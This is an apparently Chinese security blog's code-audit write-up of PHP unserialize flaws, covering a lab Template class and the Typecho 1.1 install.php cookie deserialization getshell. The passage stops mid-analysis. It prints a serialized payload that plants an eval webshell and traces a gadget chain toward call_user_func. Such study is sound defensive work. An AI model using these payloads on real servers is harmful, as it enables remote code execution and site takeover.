@@ -1,0 +1,1027 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="PHP-Audit-Labs项目地址：https://www.ripstech.com/php-security-calendar-2017/ 123456789101112131415161718192021222324252627282930313233343536373839&amp;lt;?phpclass Template &amp;#123;  public $cacheFile = &apos;/tmp/ca">
+<meta name="keywords" content="Web安全，移动安全，windows安全，漏洞挖掘，代码审计，智能合约">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP-Audit-Labs-Day11-unserialize反序列化漏洞">
+<meta property="og:url" content="https://wh0ale.github.io/2019/09/01/PHP-Audit-Labs-Day11-unserialize反序列化漏洞/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="PHP-Audit-Labs项目地址：https://www.ripstech.com/php-security-calendar-2017/ 123456789101112131415161718192021222324252627282930313233343536373839&amp;lt;?phpclass Template &amp;#123;  public $cacheFile = &apos;/tmp/ca">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-01_18-31-19.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/20180912184813-58ebe570-b679-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-01_19-04-02.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-01_19-07-18.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-01_19-10-11.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-01_20-03-23.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-01_20-09-55.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-01_20-19-20.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180912184815-5a08c69e-b679-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180912184815-5a455b4a-b679-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180912184815-5a795706-b679-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180912184816-5a93a69c-b679-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180930160812-f9a5b2a4-c487-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180930160818-fd1ec7ea-c487-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180930160823-005e3dbe-c488-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180930160829-039dce9a-c488-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180930160837-086325ec-c488-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180930160843-0c3a00b4-c488-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180930160849-0f995372-c488-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180930160856-144ba618-c488-1.png">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.336Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PHP-Audit-Labs-Day11-unserialize反序列化漏洞">
+<meta name="twitter:description" content="PHP-Audit-Labs项目地址：https://www.ripstech.com/php-security-calendar-2017/ 123456789101112131415161718192021222324252627282930313233343536373839&amp;lt;?phpclass Template &amp;#123;  public $cacheFile = &apos;/tmp/ca">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-01_18-31-19.png">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/09/01/PHP-Audit-Labs-Day11-unserialize反序列化漏洞/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>PHP-Audit-Labs-Day11-unserialize反序列化漏洞 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/09/01/PHP-Audit-Labs-Day11-unserialize反序列化漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">PHP-Audit-Labs-Day11-unserialize反序列化漏洞
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-09-01 16:05:42" itemprop="dateCreated datePublished" datetime="2019-09-01T16:05:42+08:00">2019-09-01</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">12k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">11 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="PHP-Audit-Labs"><a href="#PHP-Audit-Labs" class="headerlink" title="PHP-Audit-Labs"></a>PHP-Audit-Labs</h1><p>项目地址：<a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">https://www.ripstech.com/php-security-calendar-2017/</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $cacheFile = <span class="string">'/tmp/cachefile'</span>;</span><br><span class="line">  <span class="keyword">public</span> $template = <span class="string">'&lt;div&gt;Welcome back %s&lt;/div&gt;'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data = null)</span> </span>&#123;<span class="comment">//传入$data变量</span></span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;loadData($data);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;render($data);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadData</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">'O:'</span><span class="comment">//截取$data参数的前两个字符，判断反序列化内容是否为对象</span></span><br><span class="line">      &amp;&amp; !preg_match(<span class="string">'/O:\d:/'</span>, $data)) &#123;<span class="comment">//匹配 字符串为 \'O:任意十进制</span></span><br><span class="line">      <span class="keyword">return</span> unserialize($data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> [];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createCache</span><span class="params">($file = null, $tpl = null)</span> </span>&#123;</span><br><span class="line">    $file = $file ?? <span class="keyword">$this</span>-&gt;cacheFile;</span><br><span class="line">    $tpl = $tpl ?? <span class="keyword">$this</span>-&gt;template;</span><br><span class="line">    file_put_contents($file, $tpl);<span class="comment">//file_put_contents会被调用</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> sprintf(</span><br><span class="line">      <span class="keyword">$this</span>-&gt;template,</span><br><span class="line">      htmlspecialchars($data[<span class="string">'name'</span>])</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;createCache();<span class="comment">//实例化templement，对象销毁时会调用 createCache() 函数</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Template($_COOKIE[<span class="string">'data'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>首先观察<code>unserialize</code>反序列化函数，此时看到<code>loadData</code>函数对传入的<code>$data</code>进行判断。</li>
+<li>接着观察传入<code>$data</code>参数的<code>__construct()</code> 构造函数</li>
+<li>在<code>37行</code>中对<code>Templete</code>进行实例化，并将 <strong>cookie</strong> 中键为&#39;data&#39;数据作为初始化数据进行传入</li>
+<li>对传入的<code>cookie</code>进行控制</li>
+<li>在代码32行，对象销毁时会调用 <strong>createCache()</strong> 函数，函数将 <code>$template</code> 中的内容放到了 <code>$cacheFile</code> 对应的文件中。<strong>file_put_contents()</strong> 函数，当文件不存在时，会创建该文件。由此可构造一句话，写入当前路径。</li>
+<li><code>$cacheFile</code> 和 <code>$template</code> 为类变量，反序列化可控</li>
+<li>构造以下反序列化内容，别忘了加&#39;+&#39;号</li>
+</ol>
+<p>构造payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cacheFile = <span class="string">'/test.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $template = <span class="string">'&lt;?php eval($_POST[xxxxx]);?&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$temp = <span class="keyword">new</span> Template();</span><br><span class="line">$test =<span class="keyword">array</span>($temp);</span><br><span class="line"><span class="keyword">print</span>(serialize($test));</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;i:0;O:8:&quot;Template&quot;:2:&#123;s:9:&quot;cacheFile&quot;;s:9:&quot;/test.php&quot;;s:8:&quot;template&quot;;s:28:&quot;&lt;?php eval($_POST[xxxxx]);?&gt;&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>生成<code>test.php</code>内容为<code>&lt;?php eval($_POST[xxxxx]);?&gt;</code></p>
+<h1 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h1><p>本次实例分析，选取的是 <strong>Typecho-1.1</strong> 版本，在该版本中，用户可通过反序列化Cookie数据进行前台Getshell。该漏洞出现于 <strong>install.php</strong> 文件 <strong>230行</strong> ，具体代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)));<span class="comment">//对Cookie中的数据base64解码</span></span><br><span class="line">	Typecho_Cookie::delete(<span class="string">'__typecho_config'</span>);<span class="comment">//进行了反序列化操作</span></span><br><span class="line">	$db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">'adapter'</span>], $config[<span class="string">'prefix'</span>]);</span><br><span class="line">	$db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">	Typecho_Db::set($db);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在<code>install.php</code>前面几行我们可以查看到判断条件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断是否已经安装</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'finish'</span>]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . <span class="string">'/config.inc.php'</span>) &amp;&amp; <span class="keyword">empty</span>($_SESSION[<span class="string">'typecho'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 挡掉可能的跨站请求</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET) || !<span class="keyword">empty</span>($_POST)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_REFERER'</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $parts = parse_url($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($parts[<span class="string">'port'</span>])) &#123;</span><br><span class="line">        $parts[<span class="string">'host'</span>] = <span class="string">"&#123;$parts['host']&#125;:&#123;$parts['port']&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($parts[<span class="string">'host'</span>]) || $_SERVER[<span class="string">'HTTP_HOST'</span>] != $parts[<span class="string">'host'</span>]) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>第一个if判断，可通过GET传递 <strong>finish=任意值</strong> 绕过 </li>
+<li>第二if判断是否有GET或者POST传参，并判断Referer是否为空</li>
+<li>第四个if判断Referer是否为本站点</li>
+</ol>
+<p>在<code>213行</code>接着进行判断</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-01_18-31-19.png" alt></p>
+<ol>
+<li>第一个if判断 <strong>$_GET[&#39;finish&#39;]</strong> 是否设置</li>
+<li>然后判断 <strong>config.inc.php文件</strong> 是否存在</li>
+<li>安装后已存在，第三个判断cookie中 <strong>__typecho_config</strong> 参数是否为空，不为空。进入else分支。</li>
+</ol>
+<p>综上，具体构造如下图：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/20180912184813-58ebe570-b679-1.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$config = unserialize(base64_decode(Typecho_Cookie::get(&apos;__typecho_config&apos;)));</span><br><span class="line">Typecho_Cookie::delete(&apos;__typecho_config&apos;);</span><br><span class="line">$db = new Typecho_Db($config[&apos;adapter&apos;], $config[&apos;prefix&apos;]);</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>反序列化结果存储到 <strong>$config</strong> 变量中</li>
+<li>然后将 <strong>$config[&#39;adapter&#39;]</strong> 和 <strong>$config[&#39;prefix&#39;]</strong> 作为 <strong>Typecho_Db</strong>类的初始化变量创建类实例。</li>
+</ol>
+<p>我们可以在 <strong>var/Typecho/Db.php</strong> 文件中找到该类构造函数代码，具体如下：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-01_19-04-02.png" alt></p>
+<p>上图代码 <strong>第120行</strong> ，对传入的 <strong>$adapterName</strong> 变量进行了字符串拼接操作，对于PHP而言，如果 <strong>$adapterName</strong> 类型为对象，则会调用该类 <strong>__toString()</strong> 魔术方法。可作为反序列化的一个触发点，我们全局搜索一下 <strong>__toString()</strong> ，查看是否有可利用的点。实际搜索时，会发现有三个类都定义了 <strong>__toString()</strong> 方法：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-01_19-07-18.png" alt></p>
+<ul>
+<li>第一处 <strong>var\Typecho\Config.php</strong>：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;_currentConfig);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用 <strong>serialize()</strong> 函数进行序列化操作，会自动触发 <strong>__sleep()</strong> ，如果存在可利用的 <strong>__sleep()</strong> ，则可以进一步利用。</p>
+<ul>
+<li>第二处 <strong>var\Typecho\Db\Query.php</strong>：</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-01_19-10-11.png" alt></p>
+<p>该方法用于构建SQL语句，并没有执行数据库操作，所以暂无利用价值。</p>
+<ul>
+<li><p>第三处<strong>var\Typecho\Feed.php</strong>：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-01_20-03-23.png" alt></p>
+</li>
+</ul>
+<p>在代码 <strong>237行</strong> ， <strong>$this-&gt;_items</strong> 为类变量，反序列化可控，在代码 <strong>358行</strong> ， <strong>$item[&#39;author&#39;]-&gt;screenName</strong>，如果 <strong>$item[&#39;author&#39;]</strong> 中存储的类没有&#39;screenName&#39;属性或该属性为私有属性，此时会触发该类中的 <strong>__get()</strong> 魔法方法，这个可作为进一步利用的点，继续往下看代码，未发现有危险函数的调用。</p>
+<p>记一波魔术方法及对应的触发条件，具体如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() <span class="comment">//使用unserialize时触发</span></span><br><span class="line">__sleep() <span class="comment">//使用serialize时触发</span></span><br><span class="line">__destruct() <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__call() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line">__get() <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line">__invoke() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure>
+
+<p>在 <strong>var/Typecho/Request.php</strong> 的 <strong>Typecho_Request</strong> 类中，我们发现 <strong>__get()</strong> 方法，跟踪该方法的调用，具体如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>array_map()</strong> 函数和 <strong>call_user_func</strong> 函数，都可以作为利用点</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-01_20-09-55.png" alt></p>
+<p><strong>$filter</strong> 作为调用函数，<strong>$value</strong> 为函数参数，跟踪变量,看一下是否可控。这两个变量都来源于类变量，反序列化可控。从上面的分析中，可知当 <strong>$item[&#39;author&#39;]</strong> 满足一定条件会触发 <strong>__get</strong> 方法。</p>
+<p>假设 <strong>$item[&#39;author&#39;]</strong> 中存储 <strong>Typecho_Request</strong> 类实例，此时调用 <strong>$item[&#39;author&#39;]-&gt;screenName</strong> ，在<strong>Typecho_Request</strong> 类中没有该属性，就会调用类中的 <strong>__get($key)</strong> 方法，<strong>$key</strong> 传入的值为 <strong>scrrenName</strong> 。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-01_20-19-20.png" alt></p>
+<p>参数传递过程如下：<code>$key=&#39;scrrenName&#39;</code>=&gt;<code>$this-&gt;_param[$key]</code>=&gt;<code>$value</code></p>
+<p>我们将 <strong>$this-&gt;_param[&#39;scrrenName&#39;]</strong> 的值设置为想要执行的函数，构造 <strong>$this-&gt;_filter</strong> 为对应函数的参数值，具体构造如下：    </p>
